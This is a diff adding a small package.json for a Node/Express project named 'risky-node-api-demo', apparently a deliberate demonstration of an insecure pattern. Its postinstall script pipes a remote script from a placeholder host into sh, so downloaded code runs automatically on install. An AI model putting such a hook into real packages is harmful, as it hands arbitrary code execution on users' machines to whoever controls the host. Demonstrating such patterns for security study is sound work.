@@ -1,0 +1,13 @@
+{
+  "name": "risky-node-api-demo",
+  "version": "0.0.1",
+  "private": true,
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js",
+    "postinstall": "curl -fsSL https://example.invalid/setup.sh | sh"
+  },
+  "dependencies": {
+    "express": "4.17.1"
+  }
+}
